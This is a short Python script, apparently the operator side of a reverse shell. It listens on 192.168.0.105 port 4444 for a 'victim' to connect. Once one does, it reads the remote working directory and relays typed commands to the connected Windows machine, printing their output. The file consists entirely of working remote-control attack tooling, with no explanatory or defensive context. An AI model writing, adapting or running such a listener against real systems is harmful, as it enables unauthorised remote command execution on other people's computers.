import socket
import time


def pwd(sock: socket.socket):
    sock.send(b'echo %cd%')

    directory = sock.recv(1024).decode('cp866').strip()
    return directory


while True:
    attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    attacker.bind(('192.168.0.105', 4444))
    attacker.listen(5)

    print('Waiting for connections...\n')

    victim, addr = attacker.accept()
    print(f'Connection from: {addr}\n')

    while True:
        try:
            command = input(f'{pwd(victim)}> ')
            victim.send(command.encode('cp866'))

            if command.lower() == 'exit':
                break

            output = victim.recv(4096).decode('cp866')
            if output.strip():
                print(output)
        except:
            attacker.close()
            victim.close()
            break

    attacker.close()
    victim.close()
    time.sleep(1)
